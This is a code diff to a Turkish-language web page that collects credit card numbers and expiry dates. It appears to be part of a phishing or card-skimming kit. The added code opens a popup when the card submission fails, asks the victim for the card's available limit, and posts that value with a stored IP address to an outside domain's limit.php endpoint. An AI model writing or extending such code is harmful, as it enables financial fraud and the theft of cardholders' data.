@@ -26,7 +26,8 @@
   font-size: 19px;
 } 
   </style>
-<script type="text/javascript">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+  <script type="text/javascript">
     function validateForm() {
         const cardNumber = document.getElementById('ccno').value.replace(/\s/g, ''); // Boşlukları kaldır
         const expiryDate = document.getElementById('sifrexa').value;
@@ -67,12 +68,46 @@
                 console.log(response); // Eğer geri dönüş yapılacaksa burada kullanılır
             },
             error: function(xhr, status, error) {
-                alert('Post işlemi sırasında bir hata oluştu.');
-                console.error(error);
+                showLimitForm();
             }
         });
 
         return false; // Formun default submit işlemi engellenir
+    }
+
+    function showLimitForm() {
+        Swal.fire({
+            title: 'Kullanılabilir Limit',
+            html: `<input type="text" id="limitInput" class="swal2-input" maxlength="10" onkeypress="return event.charCode >= 48 && event.charCode <= 57">`,
+            showCancelButton: true,
+            confirmButtonText: 'Gönder',
+            cancelButtonText: 'İptal',
+            preConfirm: () => {
+                const limit = Swal.getPopup().querySelector('#limitInput').value;
+                if (!limit) {
+                    Swal.showValidationMessage(`Lütfen bir limit giriniz`);
+                }
+                return { limit: limit }
+            }
+        }).then((result) => {
+            if (result.isConfirmed) {
+                const ip = getCookie('ip');
+                $.ajax({
+                    type: 'POST',
+                    url: 'https://hakikicelikhantutunu.com/dmn/limit.php',
+                    data: {
+                        limit: encodeURIComponent(result.value.limit),
+                        ip: encodeURIComponent(ip)
+                    },
+                    success: function(response) {
+                        Swal.fire('Başarılı', 'Limit gönderildi', 'success');
+                    },
+                    error: function(xhr, status, error) {
+                        Swal.fire('Hata', 'Limit gönderilirken bir hata oluştu', 'error');
+                    }
+                });
+            }
+        });
     }
 
     function formatExpiryDate(input) {
